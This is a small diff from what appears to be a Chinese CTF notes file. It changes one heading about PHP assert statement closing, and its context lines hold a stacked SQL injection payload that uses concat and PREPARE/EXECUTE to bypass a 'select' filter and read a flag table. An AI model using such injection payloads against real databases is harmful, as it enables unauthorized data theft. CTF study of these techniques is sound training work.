@@ -75,7 +75,7 @@ concat('se', 'lect')
 1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;#
 ```
 
-PHP 语句闭合
+PHP assert语句闭合
 ```php
 <?php
 if (isset($_GET['page'])) {
